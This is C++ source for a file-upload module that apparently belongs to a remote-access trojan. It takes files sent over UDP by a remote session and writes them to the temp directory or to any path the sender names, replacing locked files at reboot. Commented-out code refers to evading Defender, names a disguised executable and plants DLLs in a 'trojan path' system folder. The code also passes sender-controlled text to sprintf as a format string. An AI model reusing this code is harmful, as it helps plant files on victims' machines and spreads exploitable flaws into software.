// UpLoadFile.cpp: implementation of the UpLoadFile class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "UpLoadFile.h"
#include <io.h>
#include <sys\stat.h>
#include "Base.h"
#include "WinApi.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
UploadFile		Uploads[5];

bool __stdcall operator<(const UDPPacket& s1, const UDPPacket& s2)
{
	return (s1.PacketSeq < s2.PacketSeq);
}

bool __stdcall operator>(const UDPPacket& s1, const UDPPacket& s2)
{
	return (s1.PacketSeq > s2.PacketSeq);
}

BOOL strTimeToFileTime(char * str14time,FILETIME &filetime){
	SYSTEMTIME strUTC;
	memset(&strUTC,0,sizeof(strUTC));
	if(sscanf(str14time,"%04d%02d%02d%02d%02d%02d",
		&strUTC.wYear,&strUTC.wMonth,&strUTC.wDay,
		&strUTC.wHour,&strUTC.wMinute,&strUTC.wSecond)==6)
		strUTC.wMilliseconds=0;
	
	else
		return FALSE;
	
	if(PSystemTimeToFileTime(&strUTC,&filetime)){
		PLocalFileTimeToFileTime(&filetime,&filetime);
		return TRUE;
	}
	else
		return FALSE;
}


BOOL SendUploadFileState(char* filename,char* state,CHAR packettype,WORD SessionID)
{
	char buffer[2000];
	memset(buffer,0,2000);
	DWORD datalen=0;
	datalen = sprintf(buffer, "filename: %s\r\n\r\n%s", filename, state);
	if(SendData(buffer,datalen,packettype,SessionID))
	{
		//SendUploadFileState %s ",buffer
	}
	return TRUE;
}

/************************************************************************/
/* �ϴ��ļ�����ģ��                                                      */
/************************************************************************/
DWORD UploadFileFun(ThreadParam *pThreadPara)
{
//	OutputDebugStringA("UploadFileFun");
	//����sessionid
	try
	{
		if(pThreadPara->TranFlg>>2==1)
		{
			//�������� �ļ���filename  ��Сcontent-length ʱ��time  sessionid 
			char * inputline=pThreadPara->buf;
			char * nextline=0;
			char *field=0;
			char * value=0;

			char * dstfile=NULL;
			char * contentlength=0;
			char * strtime=0;
			int re=0;
			re=LineParser(inputline,&nextline,&field,&value);
			while(re)
			{
				if(strcmp(field, "content-length")==0){
					contentlength=value;
				}
				else if(strcmp(field, "time")==0){
					strtime=value;
				}
				else if(stricmp(field, "filename")==0)
				{
					dstfile=value;
				}

				if(re==2)
					break;
				inputline=nextline;
				re=LineParser(inputline,&nextline,&field,&value);
			}

			if(re!=2)
				return 0;
			
			if(	!(contentlength!=0 && strtime!=0))
				return 0;
			
// 			OutputDebugStringA(contentlength);
// 			OutputDebugStringA(strtime);
// 			OutputDebugStringA(dstfile);

			//�յ��ϴ����� content-length=%s",contentlength

			char UserTemp[MAX_PATH], FileName[MAX_PATH];
			PGetTempPathA(MAX_PATH, UserTemp);

			for(int i=0;i<5;i++)
			{
				if(Uploads[i].tm==0)
				{
					UDPPacket tmpudp;
					tmpudp.PacketSeq=0;
					tmpudp.Slen = pThreadPara->datalen-((ULONG)nextline-(ULONG)(pThreadPara->buf));
 					mymemcpy(tmpudp.buf, nextline, tmpudp.Slen);
					
					Uploads[i].filesize=atol(contentlength);
					if(Uploads[i].filesize<=0)
					{
						Uploads[i].UploadFile1();
						return FALSE;
					}

					//defender��ɱ
// 					if(strlen(dstfile)<4)
// 						sprintf(FileName, "%s\\~@fatHj%d.exe", UserTemp, i);
					if(strchr(dstfile, '\\') == NULL)
						sprintf(FileName, "%s\\%s", UserTemp, dstfile);
					else
						sprintf(FileName, dstfile);
					strcpy((char *)Uploads[i].filename,FileName);
					strcat((char *)Uploads[i].filename, "$");	// �ǲ��,��ʱ�ļ�

					if(strlen(FileName)==0 || strlen(FileName)>255)
					{
						Uploads[i].UploadFile1()	;
						return FALSE;
					}
					if(!strTimeToFileTime(strtime,Uploads[i].filetime)){
						Uploads[i].UploadFile1()	;
						return FALSE;
					}
					//insert Packet
					Uploads[i].udppacketlst.push_back(tmpudp);
					Uploads[i].tm=time(0);
					Uploads[i].sessionid=pThreadPara->SessionID;
					PDeleteFileA(Uploads[i].filename);

					IF_LOUD(DbgFat32Log("Recv First UpFile name:%s, size:%d",
						Uploads[i].filename, Uploads[i].filesize);)
					break;
				}
			}
			return 0;
		}
		for(int i=0;i<5;i++)
		{
			if(pThreadPara->SessionID==Uploads[i].sessionid)
			{
				//insert Packet
				Uploads[i].tm=time(0);
				UDPPacket tmpudp;
				tmpudp.Slen=pThreadPara->datalen;
				tmpudp.PacketSeq=pThreadPara->PacketSeq;
				mymemcpy(tmpudp.buf, pThreadPara->buf, tmpudp.Slen);
				Uploads[i].udppacketlst.push_back(tmpudp);
				
				if(Uploads[i].udppacketlst.size()>40)
				{
					PDeleteFileA(Uploads[i].filename);
					SendUploadFileState(Uploads[i].filename, "error", PTYPE_UPFILE, Uploads[i].sessionid);
					Uploads[i].UploadFile1();	
					return 0;
				}
				else if(Uploads[i].udppacketlst.size()>=20)
				{
					//д�ļ� 
//					OutputDebugStringA("WriteUploadFile");
					int revalaue=WriteUploadFile(Uploads[i]);

					if(revalaue==8) //�ɹ�
					{
						SendUploadFileState(Uploads[i].filename, "ok", PTYPE_UPFILE, Uploads[i].sessionid);
						Uploads[i].UploadFile1();
						return 1;
					}
					else if(revalaue<0)
					{
						SendUploadFileState(Uploads[i].filename, "error", PTYPE_UPFILE, Uploads[i].sessionid);
						Uploads[i].UploadFile1();	
						PDeleteFileA(Uploads[i].filename);
						return revalaue;
					}
				}
				
				return 1;
			}
		}

	}
	catch (...)
	{
		//UploadFileFun Catch Error!
	}
	return 1;

}

int WriteUploadFile(UploadFile & upfile)
{
 	int re=0;
	upfile.udppacketlst.sort();
	UDPPacketListIt tmpitl,enditl;

	tmpitl = upfile.udppacketlst.begin();
	//WriteUploadFile From Seq:%d Size:%d", tmpitl->PacketSeq, upfile.udppacketlst.size()

	// (tmpudp*)(*(UINT *)(&tmpitl)+8)
	CHAR filebuffers[75000];
	int buffersize=0;
	try
	{
		while(upfile.udppacketlst.size()>0)
		{
			tmpitl=upfile.udppacketlst.begin();
			if(buffersize + tmpitl->Slen >= 75000)
			{
				//WriteUploadFile ������������������
				break;
			}
			else
			{
				if(upfile.nextseq==tmpitl->PacketSeq)
				{
					memcpy(filebuffers+buffersize,tmpitl->buf,tmpitl->Slen)	;
					buffersize+=tmpitl->Slen;
					upfile.nextseq++;
					upfile.udppacketlst.pop_front();
				}
				else
				{
					//WriteUploadFile Need:%d, Have:%d", upfile.nextseq, tmpitl->PacketSeq
					if(upfile.nextseq>tmpitl->PacketSeq)
						upfile.udppacketlst.pop_front();
					else
						break;
				}
			}
		}
		
 		if(buffersize>0){
//			OutputDebugStringA("fopen");
			FILE * fs=0;
			if(strlen(upfile.filename)==0 )
				return -1;
			
			fs=fopen(upfile.filename, "a+b");

			if(fs==0)
				return -1;
			fwrite(filebuffers,1,buffersize,fs);
			fclose(fs);
			
			struct stat fst;
			if (stat(upfile.filename, &fst) == 0){
				//%s cursize:%d", upfile.filename, fst.st_size

				if(fst.st_size==upfile.filesize)
					re=8;
				else
					re=1;
			}
			
		}
		if(re==8){
			HANDLE hfile=0;
			 
			hfile=PCreateFileA(upfile.filename,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
			if(hfile==0){
				return 8;
			}
//			PSetFileTime(hfile,&upfile.filetime,&upfile.filetime,&upfile.filetime);
			CloseHandle(hfile);
			char dllname[MAX_PATH];
			{
				strcpy(dllname, upfile.filename);
				if(dllname[strlen(upfile.filename)-1] == '$')
				{
					dllname[strlen(upfile.filename)-1] = 0;	// ȥ�����һ���ַ�
					if(_access(dllname,0)==0)
					{
						if(!PDeleteFileA(dllname))
						{
							BootMoveFile(upfile.filename,dllname);
						}
						else
						{
							rename(upfile.filename, dllname);
						}
					}
					else
					{
						rename(upfile.filename, dllname);
					}
				}
			}
//			����ϴ��ɹ���ֱ���ƶ���ָ��Ŀ¼
// 			if (strstr(dllname, ".dll") != NULL)
// 			{
// 				char WindowPath[MAX_PATH], TroPath[MAX_PATH];
// 				GetWindowsDirectoryA(WindowPath, MAX_PATH);
// 				if(!GetTroPath(TroPath))
// 				{
// 					sprintf(TroPath, "%s\\system", WindowPath);
// 				}
// 				
// 				char tmpfile1[MAX_PATH], filename[MAX_PATH];
// 				strcpy(filename, strrchr(dllname, '\\') + 1);
// 				(strrchr(filename, '.'))[0] = 0;
// 				sprintf(tmpfile1, "%s\\%s.DAT", TroPath, filename);
// 				if (!PCopyFileA(dllname, tmpfile1, TRUE))
// 				{
// 					char tmpfile2[MAX_PATH];
// 					sprintf(tmpfile2, "%s\\%s", TroPath, filename);
// 					PCopyFileA(dllname, tmpfile2, FALSE);
// 					MoveFileExA(tmpfile2, tmpfile1, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_REPLACE_EXISTING);
// 				}
// 			}
		}

	}catch (...){
		//WriteUpdateFile Catch Error!
	}
	return re;
}

void CloseUploadFile()
{
	time_t tm=time(0);
	for(int i=0;i<5;i++	)
	{
		//�ж�ʱ��
		if(Uploads[i].tm>0 && abs(Uploads[i].tm-tm)>10)
		{
			//Process CloseUploadFile, file:%s", Uploads[i].filename
			//д�ļ�
			if(WriteUploadFile(Uploads[i])!=8)//�ļ���������
			{
				PDeleteFileA(Uploads[i].filename);
				SendUploadFileState(Uploads[i].filename, "error", PTYPE_UPFILE, Uploads[i].sessionid);
			}
			else //�ɹ�����
			{
				SendUploadFileState(Uploads[i].filename, "ok", PTYPE_UPFILE, Uploads[i].sessionid);
			}
			Uploads[i].UploadFile1();
			break;
		}
	}
}

DWORD SetUpFileFun(ThreadParam *pThreadPara)
{
	//�������� �ļ���filename  ��Сcontent-length ʱ��time  sessionid 
	char * inputline=pThreadPara->buf;
	char * nextline=0;
	char *field=0;
	char * value=0;
	
	char * dstfile = NULL;
	char * contentlength = NULL;
	char * strtime = NULL;
	char * strMD5 = NULL;
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(strcmp (field, "length") == 0) {
			contentlength = value;
		}
		else if (strcmp(field, "time") == 0) {
			strtime = value;
		}
		else if (stricmp(field, "filename") == 0) {
			dstfile = value;
		}
		else if (stricmp(field, "md5") == 0) {
			strMD5 = value;
		}
		
		if(re==2)
			break;
		inputline = nextline;
		re=LineParser(inputline, &nextline, &field, &value);
	}
	
	if(re!=2)
		return 0;
	
	if(	!(contentlength != NULL && dstfile != NULL && strMD5 != NULL) )
		return 0;

	WCHAR wdstfile[MAX_PATH];
	UTF_82Unicode(dstfile, wdstfile, MAX_PATH);

	if (_waccess(wdstfile, 0) == 0)
	{
		//�ļ�����
		char md5str[33];
		memset(md5str, 0, 33);
		MD5TranFile1(md5str, wdstfile);

		if (stricmp(strMD5, md5str) == 0)
		{
			//�ɹ�
			return 1;
		}
	}

	//�ж���ʱ�ļ�
	wcscat(wdstfile, L"$");	// �ǲ��,��ʱ�ļ�
	if (_waccess(wdstfile, 0) == 0)
	{
		//��������
	}
	else
	{
		//��������
	}

	return 1;
}



